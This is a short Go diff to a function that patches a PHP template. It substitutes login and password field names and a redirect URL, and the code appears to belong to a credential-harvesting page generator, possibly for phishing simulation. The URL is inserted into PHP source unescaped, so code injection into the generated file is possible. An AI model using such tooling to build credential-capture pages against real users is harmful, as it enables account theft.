@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"html"
 	"io/ioutil"
 	"path"
 )
@@ -31,19 +32,20 @@ func patchPhp(phppath string, postLogin string, postPassword string, urlin strin
 	if err != nil {
 		return err
 	}
-
 	newContents := []byte(read)
 
-	// replace login and password names from form
+	// replace login and password with data collected from the form
 	if postLogin != "login" {
-		newContents = bytes.Replace(newContents, []byte("$_REQUEST['login']"), []byte("$_REQUEST['"+postLogin+"']"), -1)
+		postLogin = html.EscapeString(postLogin)
+		newContents = bytes.Replace(newContents, []byte("$parsed['login']"), []byte("$parsed['"+postLogin+"']"), -1)
 	}
 
 	if postPassword != "password" {
-		newContents = bytes.Replace(newContents, []byte("$_REQUEST['password']"), []byte("$_REQUEST['"+postPassword+"']"), -1)
+		postPassword = html.EscapeString(postPassword)
+		newContents = bytes.Replace(newContents, []byte("$parsed['password']"), []byte("$parsed['"+postPassword+"']"), -1)
 	}
 
-	// replace landing page with given URL
+	// replace landing page with destination URL
 	newContents = bytes.Replace(newContents, []byte("header('Location: \"\"');"), []byte("header('Location: "+urlin+"');"), -1)
 
 	err = ioutil.WriteFile(phppath, newContents, 0)
